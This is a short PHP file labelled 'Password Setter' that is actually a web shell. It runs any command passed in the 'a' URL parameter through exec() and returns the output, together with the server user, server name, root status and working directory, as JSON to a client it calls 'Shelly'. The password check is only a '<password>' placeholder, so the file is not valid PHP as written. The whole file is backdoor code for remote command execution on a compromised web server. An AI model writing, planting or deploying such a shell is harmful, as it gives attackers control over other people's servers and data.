<?php
#Password Setter
if(!empty($_GET)){
	if($_GET['pass']){
		<password> 
			if(!empty($_GET['a'])){
				$command = exec($_GET['a']);
			}
			if(empty($command)){
				@$command = "command not found: ".$_GET['a'];
			}

			if(exec("whoami") == "root"){
				$user_bash = "#";
			}else{
				$user_bash = "$";
			}
			if(exec("pwd")==getcwd()){
				$pwd = "~";
			}else{
				$pwd = exec("pwd");
			}
		$json = array("response" => "200",
					  "server_info" => array("user"=>exec("whoami"),"server_name" => $_SERVER['SERVER_NAME'],"user_bash" => $user_bash,"pwd"=>$pwd),
					  "command" => $command,);
		}else{
		
		$json = array("response" => "302",
					  "error" => "Invalid Password");	
		}
		//Response to Shelly				
		echo json_encode($json);
	}
}
?>